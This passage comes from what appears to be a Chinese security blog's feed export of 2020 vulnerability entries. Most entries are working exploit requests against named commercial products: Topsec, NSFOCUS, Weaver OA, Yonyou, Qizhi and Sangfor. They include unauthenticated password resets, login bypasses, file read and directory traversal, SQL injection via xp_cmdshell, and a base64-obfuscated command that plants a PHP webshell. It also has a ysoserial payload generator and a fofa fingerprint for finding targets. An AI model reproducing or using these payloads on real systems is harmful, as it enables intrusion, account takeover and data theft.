<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php(.*)$ &#123;</span><br><span class="line">      if ( $fastcgi_script_name ~ \..*\&#x2F;.*php )&#123;</span><br><span class="line">        return 403;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">            fastcgi_pass   127.0.0.1:9000;</span><br><span class="line">            fastcgi_index  index.php;</span><br><span class="line">            fastcgi_split_path_info  ^((?U).+\.php)(&#x2F;?.+)$;</span><br><span class="line">            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">            fastcgi_param  PATH_INFO  $fastcgi_path_info;</span><br><span class="line">            fastcgi_param  PATH_TRANSLATED  $document_root$fastcgi_path_info;</span><br><span class="line">            include        fastcgi_params;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考链接：<a href="https://mrxn.net/news/675.html">https://mrxn.net/news/675.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>PhpStudy</tag>
        <tag>nginx解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>天融信数据防泄漏系统越权修改管理员密码</title>
    <url>/2020/09/13/WEB/Exploit/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<p>无需登录权限,由于修改密码处未校验原密码,且/?module=auth_user&amp;action=mod_edit_pwd</p>
<p>接口未授权访问,造成直接修改任意用户密码。:默认superman账户uid为1。</p>
<a id="more"></a>

<p>POST /?module=auth_user&amp;action=mod_edit_pwd </p>
<p>Cookie: username=superman;</p>
<p>uid=1&amp;pd=Newpasswd&amp;mod_pwd=1&amp;dlp_perm=1</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913020248653.png" alt="image-20200913020248653"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>天融信</tag>
      </tags>
  </entry>
  <entry>
    <title>宝塔面板phpmyadmin未授权访问漏洞</title>
    <url>/2020/09/12/WEB/Exploit/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>phpmyadmin未授权访问漏洞</p>
<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>宝塔Linux面板7.4.2版本和Windows面板6.8版本</p>
<a id="more"></a>

<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞未phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。</p>
<p>漏洞URL：<a href="http://ip:888/pma">http://ip:888/pma</a>   即可直接登录（但要求必须安装了phpmyadmin）</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200905165002377.png" alt="image-20200905165002377"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>宝塔</tag>
        <tag>未授权访问漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>泛微OA云桥任意文件读取和目录遍历漏洞</title>
    <url>/2020/09/14/WEB/Exploit/%E6%B3%9B%E5%BE%AEOA%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>未授权任意文件读取,/wxjsapi/saveYZJFile接口获取filepath,输入文件路径-&gt;读取文件内容。返回数据包内出现了程序的绝对路径,攻击者可以通过返回内容识别程序运行路径从而下载数据库配置文件危害可见。</p>
<a id="more"></a>

<p>1、 downloadUrl参数修改成需要获取文件的绝对路径,记录返回包中的id值。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150710482.png" alt="image-20200914150710482"></p>
<p>2、通过查看文件接口访问 /file/fileNoLogin/id</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150728248.png" alt="image-20200914150728248"></p>
<p>想到一个新的思路，能够在漏洞利用过程中找到更多有用的信息。</p>
<p>1、简单说说昨天泛微云桥的报告,输入文件路径-&gt;读取文件内容,我们读了一下代码后发现这还能读取文件目录。</p>
<p>2、参数不填写绝对路径写进文本内容就是当前的目录,产生了一个新的漏洞 “目录遍历”</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150903715.png" alt="image-20200914150903715"></p>
<p>3、目录遍历+文件读取,我们能做的事情就很多了,比如读取管理员在桌面留下的密码文件、数据库配置文件、nginx代理配置、访问日志、D盘迅雷下载。</p>
<p>d://ebridge//tomcat//webapps//ROOT//WEB-INF//classes//init.properties</p>
<p>d:/OA/tomcat8/webapps/OAMS/WEB-INF/classes/dbconfig.properties 泛微OA数据库</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914150946564.png" alt="image-20200914150946564"></p>
<p>修复建议:</p>
<p>关闭程序路由 /file/fileNoLogin</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>泛微OA</tag>
      </tags>
  </entry>
  <entry>
    <title>绿盟UTS综合威胁探针管理员任意登录</title>
    <url>/2020/09/13/WEB/Exploit/%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<p>绿盟全流量威胁分析解决方案针对原始流量进行采集和监控，对流量信息进行深度还原、存储、查询和分析，可以及时掌握重要信息系统相关网络安全威胁风险，及时检测漏洞、病毒木马、网络攻击情况，及时发现网络安全事件线索，及时通报预警重大网络安全威胁，调查、防范和打击网络攻击等恶意行为，保障重要信息系统的网络安全。<br>绿盟综合威胁探针设备版本V2.0R00F02SP02及之前存在此漏洞。</p>
<a id="more"></a>

<p>处置意见:<br>建议尽快更新补丁至最新： <a href="http://update.nsfocus.com/update/listBsaUtsDetail/v/F02">http://update.nsfocus.com/update/listBsaUtsDetail/v/F02</a></p>
<hr>
<p>漏洞利用过程：<br><a href="https://www.hackbug.net/usr/uploads/2020/09/1229899313.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1229899313.png" alt="1.png"></a><br><a href="https://www.hackbug.net/usr/uploads/2020/09/2582773457.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/2582773457.png" alt="2.png"></a><br>对响应包进行修改，将false更改为true的时候可以泄露管理用户的md5值密码<br><a href="https://www.hackbug.net/usr/uploads/2020/09/3504865237.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3504865237.png" alt="3.png"></a><br><a href="https://www.hackbug.net/usr/uploads/2020/09/3291977248.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3291977248.png" alt="4.png"></a><br><a href="https://www.hackbug.net/usr/uploads/2020/09/1281439051.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1281439051.png" alt="5.png"></a><br>利用渠道的md5值去登录页面<br><a href="https://www.hackbug.net/usr/uploads/2020/09/3782919846.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3782919846.png" alt="6.png"></a><br>7ac301836522b54afcbbed714534c7fb<br><a href="https://www.hackbug.net/usr/uploads/2020/09/370804192.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/370804192.png" alt="6.png"></a><br><a href="https://www.hackbug.net/usr/uploads/2020/09/78344586.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/78344586.png" alt="8.png"></a><br>成功登录，登录后通过管理员权限对设备进行管控，并且可以看到大量的攻击信息，泄露内部网络地址包括资产管理。</p>
<h2 id="本文链接："><a href="#本文链接：" class="headerlink" title="本文链接："></a>本文链接：</h2><p><a href="https://www.hackbug.net/archives/112.html">https://www.hackbug.net/archives/112.html</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>绿盟</tag>
      </tags>
  </entry>
  <entry>
    <title>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</title>
    <url>/2020/09/13/WEB/Exploit/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2019-20835%EF%BC%89/</url>
    <content><![CDATA[<p>齐治堡垒机前台远程命令执行漏洞（CNVD-2019-20835）</p>
<p>未授权无需登录。</p>
<a id="more"></a>

<p>1、访问 <a href="http://10.20.10.11/listener/cluster_manage.php">http://10.20.10.11/listener/cluster_manage.php</a>  :返回 “OK”.</p>
<p>2、访问如下链接即可getshell，执行成功后，生成PHP一句话马</p>
<p>3、/var/www/shterm/resources/qrcode/lbj77.php 密码10086</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;10.20.10.10&#x2F;ha_request.php?action&#x3D;install&amp;ipaddr&#x3D;10.20.10.11&amp;node_id&#x3D;1$&#123;IFS&#125;|&#96;echo$&#123;IFS&#125;&quot; ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64$&#123;IFS&#125;- d|bash&#96;|$&#123;IFS&#125;|echo$&#123;IFS&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913015044393.png" alt="image-20200913015044393"></p>
<p>这里假设10.20.10.10为堡垒机的IP地址。</p>
<p>另外一个版本是java的。</p>
<p>POST /shterm/listener/tui_update.php</p>
<p>a=[“t’;import os;os.popen(‘whoami’)#”]</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915094059411.png" alt="image-20200915094059411"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>齐治堡垒机</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化</title>
    <url>/2020/09/12/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="﻿Java反序列化"></a>﻿Java反序列化</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Java反序列化漏洞最早是2015年年初AppSecCali会议上提出了漏洞利用思路，在2015年11月FoxGlove Security 安全团队才真实利用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的，这个漏洞直接 可以攻击WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版，在当时被称为是”2015年最被低估的漏洞”。</p>
<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有 力的数据结构类型并且实现了各种集合工具类。包括FileUpload、Betwixt、Commons Code、Commons Compress、 Commons CSV等开源工具(下面是JAVA COLLECTION 的介绍)。</p>
<a id="more"></a>

<p><strong>Java Collection</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVACOLLECION是java的集合类，用于存储对象，而且长度可变，可存储不同类型的对象。JAVACOLLECTION不同的容器对数据</span><br><span class="line">    的存储方式不同，即数据结构不同。JAVA集合的体系框架:</span><br><span class="line"></span><br><span class="line">collection(接口,最基本的集合)实现接口的类，集合类:</span><br><span class="line"></span><br><span class="line">set</span><br><span class="line"></span><br><span class="line">HashSet&#x2F;TreeSet...</span><br><span class="line"></span><br><span class="line">list</span><br><span class="line"></span><br><span class="line">ArrayList&#x2F;LinkedList...</span><br><span class="line"></span><br><span class="line">map</span><br><span class="line"></span><br><span class="line">vector</span><br></pre></td></tr></table></figure>

<h2 id="Java反序列化概念"><a href="#Java反序列化概念" class="headerlink" title="Java反序列化概念"></a>Java反序列化概念</h2><p>在Java程序中，序列化是程序将对象转换为字节数组，反序列化即为逆过程，将客户端的字节数据转换成对象。 序列化的目的是将对象转换为可存储或传输的字节数组，实现持久化存储。<br>实际开发代码(部分):</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class RedisObjectSerializer implements RedisSerializer&lt;Object&gt; &#123; </span><br><span class="line">    private Converter&lt;Object, byte[]&gt; serializer &#x3D; new SerializingConverter();</span><br><span class="line">    private Converter&lt;byte[], Object&gt; deserializer &#x3D; new DeserializingConverter(); </span><br><span class="line">static final byte[] EMPTY_ARRAY &#x3D; new byte[0];</span><br><span class="line">public Object deserialize(byte[] bytes) &#123; </span><br><span class="line">    if (isEmpty(bytes)) &#123;</span><br><span class="line">        return null; &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        return deserializer.convert(bytes);</span><br><span class="line">    &#125; catch (Exception ex) &#123;</span><br><span class="line">        throw new SerializationException(&quot;Cannot deserialize&quot;, ex);</span><br><span class="line">    &#125;﻿</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; 序列化方法</span><br><span class="line">&#x2F;&#x2F; 如果Bytes为空，返回null</span><br><span class="line">&#x2F;&#x2F; 否则使用serializer.convert(bytes)为Object</span><br><span class="line">public byte[] serialize(Object object) &#123; </span><br><span class="line">    if (object &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return EMPTY_ARRAY; &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">    return serializer.convert(object);</span><br><span class="line">    &#125; catch (Exception ex) &#123; return EMPTY_ARRAY;</span><br><span class="line">    &#125; &#125;</span><br><span class="line">&#x2F;&#x2F;判断字节数组是否为空</span><br><span class="line">&#x2F;&#x2F;@param data</span><br><span class="line">&#x2F;&#x2F;@return</span><br><span class="line">private boolean isEmpty(byte[] data) &#123; </span><br><span class="line">    return (data &#x3D;&#x3D; null || data.length &#x3D;&#x3D; 0);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Java反序列化漏洞原理"><a href="#Java反序列化漏洞原理" class="headerlink" title="Java反序列化漏洞原理"></a>Java反序列化漏洞原理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">间接或直接暴露反序列化API，导致用户操作传入数据，攻击者可以精心构造反序列化对象并执行恶意代码。特点:</span><br><span class="line">1.aced0005是java序列化内容的特征，如果经过base64编码，那么相对应的是rO0AB。</span><br><span class="line">2.数据包中出现&quot;sr类名&quot;</span><br><span class="line">3.某些反序列化数据的content-type为application&#x2F;x-serialization</span><br></pre></td></tr></table></figure>

<h2 id="如何检测Java反序列化"><a href="#如何检测Java反序列化" class="headerlink" title="如何检测Java反序列化"></a>如何检测Java反序列化</h2><h3 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import os import base64</span><br><span class="line">payloads &#x3D; [&#39;BeanShell1&#39;, &#39;Clojure&#39;, &#39;CommonsBeanutils1&#39;, &#39;CommonsCollections1&#39;, &#39;CommonsCollections2&#39;, &#39;CommonsCollections3&#39;, &#39;CommonsCollections4&#39;, &#39;CommonsCollections5&#39;, &#39;CommonsCollections6&#39;, &#39;Groovy1&#39;, &#39;Hibernate1&#39;, &#39;Hibernate2&#39;, &#39;JBossInterceptors1&#39;, &#39;JRMPClient&#39;, &#39;JSON1&#39;, &#39;JavassistWeld1&#39;, &#39;Jdk7u21&#39;, &#39;MozillaRhino1&#39;, &#39;Myfaces1&#39;, &#39;ROME&#39;, &#39;Spring1&#39;, &#39;Spring2&#39;]</span><br><span class="line">def generate(name, cmd):</span><br><span class="line">    for payload in payloads:</span><br><span class="line">        final &#x3D; cmd.replace(&#39;REPLACE&#39;, payload)</span><br><span class="line">        print &#39;Generating &#39; + payload + &#39; for &#39; + name + &#39;...&#39;</span><br><span class="line">        command &#x3D; os.popen(&#39;java -jar ysoserial.jar &#39; + payload + &#39; &quot;&#39; + final + &#39;&quot;&#39;) result &#x3D; command.read()</span><br><span class="line">        command.close()</span><br><span class="line">        encoded &#x3D; base64.b64encode(result)</span><br><span class="line">        if encoded !&#x3D; &quot;&quot;:</span><br><span class="line">            open(name + &#39;_intruder.txt&#39;, &#39;a&#39;).write(encoded + &#39;\n&#39;)</span><br><span class="line">generate(&#39;Windows&#39;, &#39;ping -n 1 win.REPLACE.server.local&#39;) </span><br><span class="line">generate(&#39;Linux&#39;, &#39;ping -c 1 nix.REPLACE.server.local&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>将脚本生成的文件加载至Burpsuit进行Intruder，服务器端执行tcpdump icmp查看是否有命令执行成功。</strong></p>
<h2 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h2><p><a href="https://github.com/frohoff/ysoserial">ysoserial </a>是反序列化生成payload的工具。<br><a href="https://github.com/federicodotta/Java-Deserialization-Scanner">Java-Deserialization-Scanner Burpsuit</a> 插件(Burp Pro 插件商店可直接安装)，识别流量，主动被动探测。</p>
<p><a href="freddy">freddy Burpsuit </a>插件(Burp Pro 插件商店可直接安装)。 </p>
<h2 id="ysoserial工具学习"><a href="#ysoserial工具学习" class="headerlink" title="ysoserial工具学习"></a>ysoserial工具学习</h2><h3 id="java动态代理"><a href="#java动态代理" class="headerlink" title="java动态代理"></a>java动态代理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">代理委托类和代理类</span><br><span class="line"></span><br><span class="line">静态代理和动态代理静态代理，委托类和代理类同时实现一个接口，两者通过聚合实现，代理类需要有一个委托类的引用。</span><br><span class="line"></span><br><span class="line">动态代理是通过在委托类和代理类之间设置一个中介类，中介类实现InvokeHandler接口，作为调用处理器拦截对代理类方法</span><br><span class="line">    的调用.</span><br><span class="line"></span><br><span class="line">静态代理和动态代理:</span><br></pre></td></tr></table></figure>

<p>参考资料：</p>
<p>[Java Proxy和CGLIB 动态代理原理](Java Proxy 和 CGLIB 动态代理原理 Java动态代理)</p>
<p><a href="Java动态代理">Java 动态代理</a></p>
<h3 id="Java反射机制"><a href="#Java反射机制" class="headerlink" title="Java反射机制"></a>Java反射机制</h3><p>参考资料</p>
<p><a href="https://www.sczyh30.com/posts/Java/java-reflection-1/">深入解析Java反射（1）-基础</a></p>
<p>Jboss 反序列化漏洞利用实例</p>
<p>确定jboss应用</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>用友GRP-u8 注入</title>
    <url>/2020/09/13/WEB/Exploit/%E7%94%A8%E5%8F%8BGRP-u8-%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<a id="more"></a>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200914141058235.png" alt="image-20200914141058235"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;Proxy HTTP&#x2F;1.1Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;4.0 (compatible; MSIE 6.0;)Host: localhostContent-Length: 341Connection: Keep-AliveCache-Control: no-cache</span><br><span class="line">cVer&#x3D;9.8.0&amp;dp&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;GB2312&quot;?&gt;&lt;R9PACKET version&#x3D;&quot;1&quot;&gt;&lt;DATAFORMAT&gt;XML&lt;&#x2F;DATAFORMAT&gt;&lt;R9FUNCTION&gt;&lt;NAME&gt;AS_DataRequest&lt;&#x2F;NAME&gt;&lt;PARAMS&gt;&lt;PARAM&gt;&lt;NAME&gt;ProviderName&lt;&#x2F;NAME&gt;&lt;DATA format&#x3D;&quot;text&quot;&gt;DataSetProviderData&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;PARAM&gt;&lt;NAME&gt;Data&lt;&#x2F;NAME&gt;&lt;DATA format&#x3D;&quot;text&quot;&gt;exec xp_cmdshell &#39;whoami&#39;&lt;&#x2F;DATA&gt;&lt;&#x2F;PARAM&gt;&lt;&#x2F;PARAMS&gt;&lt;&#x2F;R9FUNCTION&gt;&lt;&#x2F;R9PACKET&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>用友</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服-SANGFOR终端检测响应平台-任意用户登录</title>
    <url>/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<p>前两天爆出来的命令执行，今天在给大家爆一个任意用户登录；<br>看源码看到的，我测试的时候可以打到3.2.19版本，后面的版本我就不知道了；</p>
<p>fofa指纹：<strong>title=”SANGFOR终端检测响应平台”</strong></p>
<a id="more"></a>

<hr>
<p>漏洞利用：</p>
<p>只要用户存在就可以登陆</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ip&#x2F;ui&#x2F;login.php?user&#x3D;需登录的用户名</span><br></pre></td></tr></table></figure>

<p>列如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;1.1.1.1:1980&#x2F;ui&#x2F;login.php?user&#x3D;admin</span><br></pre></td></tr></table></figure>

<p>查询完毕以后即可登录平台。<br><a href="https://www.hackbug.net/usr/uploads/2020/08/3963593927.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3963593927.png" alt="QQ截图20200820123214.png"></a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>sangfor</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服 SSL VPN - Pre Auth 修改绑定手机</title>
    <url>/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D-SSL-VPN-Pre-Auth-%E4%BF%AE%E6%94%B9%E7%BB%91%E5%AE%9A%E6%89%8B%E6%9C%BA/</url>
    <content><![CDATA[<h2 id="漏洞起因："><a href="#漏洞起因：" class="headerlink" title="漏洞起因："></a>漏洞起因：</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160030652.png" alt="image-20200917160030652"></p>
<a id="more"></a>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>老版本(M7.6.1)代码放上，看不懂的直接看 POC 吧；新版本的没绕成功还在审，所以不确定是不是这个</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160439482.png" alt="image-20200917160439482"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160456180.png" alt="image-20200917160456180"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://&lt;path&gt;/por/changetelnum.csp?apiversion=1</span><br><span class="line"></span><br><span class="line">newtel=TARGET_PHONE&amp;sessReq=clusterd&amp;username=TARGET_USERNAME&amp;grpid=0&amp;sessid=0&amp;ip=127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917160603185.png" alt="image-20200917160603185"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>sangfor</tag>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服EDR3.2.21 任意代码执行漏洞分析</title>
    <url>/2020/09/17/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8DEDR3-2-21-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154417360.png" alt="image-20200917154417360"></p>
<p>dev_linkage_launch.php 为设备联动的新入口点主要是将联动的接口构造成业务统一处理的接口</p>
<a id="more"></a>

<h3 id="主要调用"><a href="#主要调用" class="headerlink" title="主要调用"></a>主要调用</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154552300.png" alt="image-20200917154552300"></p>
<p>跟进</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154605381.png" alt="image-20200917154605381"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">可以看到 第一个检查为  req_url&#x3D;_SERVER[&#39;PHP_SELF&#39;];</span><br><span class="line"></span><br><span class="line">绕过第一个检查:</span><br><span class="line"></span><br><span class="line">在他们系统nginx配置文件里面:</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917154713639.png" alt="image-20200917154713639"></p>
<p><strong>通过</strong>nginx规则可以得知,他们没有设置禁止外网访问.从而可以直接访问</p>
<p>/api/edr/sangforinter/v2/xxx 绕过 第一个检查</p>
<h3 id="第二检查-权限检查"><a href="#第二检查-权限检查" class="headerlink" title="第二检查**:** 权限检查"></a><strong>第二检查**</strong>:** <strong>权限检查</strong></h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155137057.png" alt="image-20200917155137057">跟进check_access_token</p>
<p> <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1062563-20200911105704599-1994739155.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里if(md5_str&#x3D;&#x3D;json_token[&quot;md5&quot;]) 引发第二个漏洞: php弱类型导致的漏洞</span><br><span class="line"></span><br><span class="line">绕过只需要传入一个base64编码的json内容为 &#123;“md5”:true&#125;即可</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>至此**</strong>权限检查绕过完毕**</p>
<p><strong>来到</strong> process_cssp.php 文件</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155330169.png" alt="image-20200917155330169"></p>
<p>存在任意指令执行漏洞.作者试图使用escapeshellarg函数去给单引号打反斜杠实际上是毫无作用的.</p>
<p>绕过:{“params”:”w=123&quot;‘1234123’&quot;|命令”}</p>
<h2 id="结果如下"><a href="#结果如下" class="headerlink" title="结果如下"></a>结果如下</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155504277.png" alt="image-20200917155504277"></p>
<p>返回：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917155558597.png" alt="image-20200917155558597"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>sangfor</tag>
        <tag>EDR</tag>
      </tags>
  </entry>
  <entry>
    <title>深信服edr远程命令执行cnvd-2020-46552漏洞分析</title>
    <url>/2020/09/13/WEB/Exploit/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="EDR简介"><a href="#EDR简介" class="headerlink" title="EDR简介"></a>EDR简介</h1><p>终端检测响应平台（EDR）是深信服公司提供的一套终端安全解决方案，方案由轻量级的端点安全软件（Agent）和管理平台（MGR）共同组成。</p>
<a id="more"></a>

<h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>远程命令执行漏洞CNVD-2020-46552</p>
<p><a href="https://xn--ip+-0y3e189o/tool/log/c.php?strip_slashes=system&host=id">https://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id</a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516622.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909154516622.png" alt="img"></a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516622.png">img</a></p>
<p>漏洞分析：</p>
<p>将c.php中的文件进行分析</p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516609.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909154516609.png" alt="img"></a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154516609.png">img</a></p>
<p>$_REQUEST将传入的参数保存为数组，将前台的参数传入到$show_form</p>
<p>进入$show_form</p>
